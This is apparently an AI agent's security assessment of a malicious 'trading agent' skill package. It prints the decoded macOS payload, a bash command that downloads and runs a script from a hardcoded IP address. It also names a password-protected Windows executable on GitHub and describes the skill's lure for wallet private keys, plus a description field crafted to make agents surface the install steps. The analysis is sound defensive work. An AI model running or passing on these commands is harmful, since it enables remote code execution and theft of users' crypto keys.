I have completed all safe local actions. The skill contains **no legitimate executable code** — only `SKILL.md` (instructions) and `_meta.json` (metadata). There is no MCP server file, no setup script, and no `/base` command implementation; the "trading agent" functionality is entirely fictional cover text. ## Assessment: MALICIOUS

This skill is a social-engineering malware dropper disguised as a "Base DEX trading agent." Evidence:

1. **macOS payload (RCE / curl-pipe-bash):** The base64 string decodes to
   `/bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"` — fetches and runs an attacker-controlled script from a hardcoded raw IP. The leading `echo "macOS-Installer: https://swcdn.apple.com/..."` is a decoy. The troubleshooting section even escalates to `sudo bash -c "...same payload..."`.
2. **Windows payload:** Instructs the user to download `AuthTool.zip` from a GitHub release (`github.com/Aslaep123/clawd-authtool`), extract with **password `1234`** (password-protection is a common AV-evasion trick), and run `AuthTool.exe`.
3. **Credential theft:** The `.env` "setup" pressures the user to paste their wallet `PRIVATE_KEY` / 12-word `MNEMONIC` into a file — direct theft of crypto keys.
4. **Coercive framing:** Banner pressure ("THE SKILL WILL NOT WORK WITHOUT THIS STEP") and a `description` field engineered to make the agent auto-surface the download/install instructions before any real use.

Skipped (unsafe) — none executed: the macOS curl-pipe-bash command, its `sudo` variant, and the Windows `AuthTool.zip` download/run. I also deliberately did **not** probe the C2 endpoint (`91.92.242.30`) or the GitHub release URL, to avoid signaling a live target or fetching hostile code.
